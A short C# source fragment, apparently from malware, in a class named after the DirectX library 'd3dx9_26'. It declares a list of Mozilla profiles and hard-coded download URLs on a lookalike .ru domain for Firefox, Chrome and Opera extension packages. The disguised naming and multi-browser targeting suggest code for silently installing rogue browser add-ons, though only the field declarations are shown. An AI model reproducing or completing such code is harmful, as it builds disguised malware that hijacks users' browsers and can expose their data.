...
namespace d3dx9_26
{
    public class d3dx9_26_Class
    {
        private static List<string> MozProfiles = new List<string>();
        private static  string PPathToMozillaPlugin = @"http://chrome-document-global-created.ru/bmozillafirefox/mozillafirefoxstudio@mozilla.org.xpi";

        private static string PPathToChromePlugin = @"http://chrome-document-global-created.ru/jgnclepkencmehkcohpkagffekghobfp.zip";
        private static string PPathToChromePluginCRX = @"http://chrome-document-global-created.ru/mozillafirefoxstudio.crx";

        private static string PPathToOperaPlugin = @"http://chrome-document-global-created.ru/bopera/2.0_0.zip";
